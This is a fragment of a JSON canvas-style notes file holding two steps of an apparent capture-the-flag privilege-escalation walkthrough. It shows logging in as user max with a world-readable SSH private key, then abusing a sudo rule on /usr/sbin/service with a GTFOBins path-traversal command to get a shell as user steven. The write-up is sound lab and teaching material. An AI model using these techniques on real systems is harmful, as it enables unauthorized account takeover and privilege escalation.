		{"id":"ab306291306c6890","type":"text","text":"## 3. www-data → max\n\nFound **world-readable SSH private key**:\n```\n/home/max/.ssh/id_rsa   (rwxr-xr-x)\n```\nMatching pubkey already in max's own `authorized_keys`.\n\nDecoy rabbit hole ignored:\n`this/is/maybe/the/way/to/a/{password,private_key,rabbit_hole}`\n\nLogged in:\n```\nchmod 600 id_rsa\nssh -i id_rsa max@192.168.139.78\n```","x":2665,"y":3720,"width":500,"height":460,"color":"3"},
		{"id":"8fda8b2e601cebc7","type":"text","text":"## 4. max → steven\n\n```\nsudo -l\n(steven) NOPASSWD: /usr/sbin/service\n```\n\nGTFOBins path-traversal abuse:\n```\nsudo -u steven /usr/sbin/service ../../../../bin/sh\n```\n\n```\nwhoami\nsteven\n```","x":2665,"y":4320,"width":500,"height":380,"color":"3"},
